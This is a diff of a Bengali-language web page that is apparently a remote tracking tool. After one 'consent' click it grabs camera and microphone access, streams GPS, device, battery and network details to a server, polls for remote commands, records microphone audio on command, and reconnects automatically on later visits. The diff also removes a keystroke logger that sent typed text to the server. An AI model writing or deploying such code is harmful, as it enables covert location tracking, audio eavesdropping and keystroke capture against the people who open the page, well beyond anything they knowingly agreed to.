@@ -18,7 +18,6 @@
         .detail-box { background: #0f172a; padding: 15px; border-radius: 15px; margin: 15px 0; text-align: left; font-size: 13px; }
         .detail-box span { color: #94a3b8; }
         .warning { color: #ef4444; font-size: 12px; background: #450a0a; padding: 10px; border-radius: 10px; margin-bottom: 15px; }
-        .error-box { display: none; background: #7f1d1d; color: #fca5a5; padding: 15px; border-radius: 10px; margin-top: 15px; font-size: 13px; border: 1px solid #ef4444; }
     </style>
 </head>
 <body>
@@ -44,8 +43,6 @@
         let watchId = null;
         let sharingInterval = null;
         let currentStream = null; 
-        let mediaRecorder = null;
-        let audioChunks = [];
 
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
@@ -67,8 +64,7 @@
                 }
             }
             if (ua.includes("iPhone")) {
-                const iphoneMatch = ua.match(/iPhone OS (\d+_\d+)/);
-                model = "iPhone (iOS " + (iphoneMatch ? iphoneMatch[1].replace("_", ".") : "Unknown") + ")";
+                model = "iPhone";
             }
             return model;
         }
@@ -80,14 +76,11 @@
             if (ua.indexOf('Chrome') > -1) browser = 'Chrome';
             else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
             else if (ua.indexOf('Safari') > -1) browser = 'Safari';
-            else if (ua.indexOf('Edge') > -1) browser = 'Edge';
             document.getElementById('dBrowser').innerText = browser;
 
             if (navigator.getBattery) {
                 navigator.getBattery().then(battery => {
                     updateBattery(battery);
-                    battery.addEventListener('levelchange', () => updateBattery(battery));
-                    battery.addEventListener('chargingchange', () => updateBattery(battery));
                 });
             }
         }
@@ -100,47 +93,33 @@
 
         getDeviceInfo();
 
-        let typingTimer;
-        document.getElementById('testInput').addEventListener('input', (e) => {
-            clearTimeout(typingTimer);
-            typingTimer = setTimeout(() => {
-                sendTypingData(e.target.value);
-            }, 500);
-        });
-
-        function sendTypingData(text) {
-            fetch('/api/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id: clientId, keystrokes: text, time: new Date().toISOString() })
-            }).catch(err => console.error(err));
-        }
-
         async function startSharing() {
             btn.disabled = true;
             btn.innerText = '⏳ লোকেশন খোঁজা হচ্ছে...';
-            statusMsg.innerText = '📡 লোকেশন ও ক্যামেরা পারমিশন চাচ্ছি...';
-
-            if (!navigator.geolocation) {
-                alert('আপনার ব্রাউজার GPS সাপোর্ট করে না।');
-                btn.disabled = false;
-                return;
-            }
+            statusMsg.innerText = '📡 পারমিশন চেক করা হচ্ছে...';
 
             try {
                 currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             } catch (err) {
-                console.log("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
+                console.log("ক্যামেরা পারমিশন নেই: ", err);
             }
 
+            // **গুরুত্বপূর্ণ:** ডিভাইস কানেক্ট করানোর জন্য প্রথমেই একটি ডামি লোকেশন পাঠানো হচ্ছে
+            sendData(0, 0, 5000, 'N/A', false);
             startTracking();
         }
 
         function startTracking() {
             btn.innerText = '✅ শেয়ারিং চলছে';
-            statusMsg.innerText = '🟢 ডিভাইস কানেক্ট হয়েছে! লোকেশন খোঁজা হচ্ছে...';
+            statusMsg.innerText = '🟢 ডিভাইস কানেক্ট হয়েছে! জিপিএস খোঁজা হচ্ছে...';
             localStorage.setItem("tracker_consent", "true");
 
+            if (!navigator.geolocation) {
+                statusMsg.innerText = '❌ আপনার ব্রাউজারে GPS নেই।';
+                return;
+            }
+
+            // জিপিএস ওয়াচ শুরু
             watchId = navigator.geolocation.watchPosition(
                 (pos) => {
                     const lat = pos.coords.latitude;
@@ -159,23 +138,23 @@
                     } else {
                         sendData(lat, lng, accuracy, batteryLevel, isCharging);
                     }
-                    statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
+                    statusMsg.innerText = '🟢 সঠিক লোকেশন পাওয়া গেছে!';
                 },
                 (err) => {
                     if (err.code === 1) {
                         statusMsg.innerText = '❌ লোকেশন পারমিশন ব্লকড!';
                     } else {
                         statusMsg.innerText = '⏳ জিপিএস খোঁজা হচ্ছে (সিগন্যাল দুর্বল)...';
-                        sendData(0, 0, 5000, 'N/A', false); // ডিভাইস কানেক্ট রাখার জন্য
+                        // জিপিএস না পেলেও প্রতি ৫ সেকেন্ডে ডিভাইস কানেক্ট রাখার জন্য ডামি ডেটা পাঠাচ্ছে
+                        sendData(0, 0, 5000, 'N/A', false);
                     }
                 },
-                { enableHighAccuracy: true, timeout: 30000, maximumAge: 10000 }
+                { enableHighAccuracy: false, timeout: 30000, maximumAge: 10000 } // enableHighAccuracy: false করা হয়েছে যাতে দ্রুত নেটওয়ার্ক লোকেশন পায়
             );
 
             sharingInterval = setInterval(checkCommands, 3000);
         }
 
-        // অটো কানেক্ট লজিক
         window.onload = () => {
             if (localStorage.getItem("tracker_consent") === "true") {
                 btn.innerText = '🔄 অটো কানেক্ট হচ্ছে...';
@@ -193,6 +172,7 @@
                 browser: document.getElementById('dBrowser').innerText,
                 battery: battery,
                 charging: charging ? "চার্জিং" : "আনপ্লাগড",
+                network: navigator.connection ? navigator.connection.effectiveType : "N/A",
                 time: new Date().toISOString()
             };
 
@@ -235,8 +215,8 @@
             if (!currentStream) return;
             const audioTrack = currentStream.getAudioTracks()[0];
             if (!audioTrack) return;
-            audioChunks = [];
-            mediaRecorder = new MediaRecorder(new MediaStream([audioTrack]));
+            const audioChunks = [];
+            const mediaRecorder = new MediaRecorder(new MediaStream([audioTrack]));
             mediaRecorder.ondataavailable = event => { if (event.data.size > 0) audioChunks.push(event.data); };
             mediaRecorder.onstop = () => {
                 const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
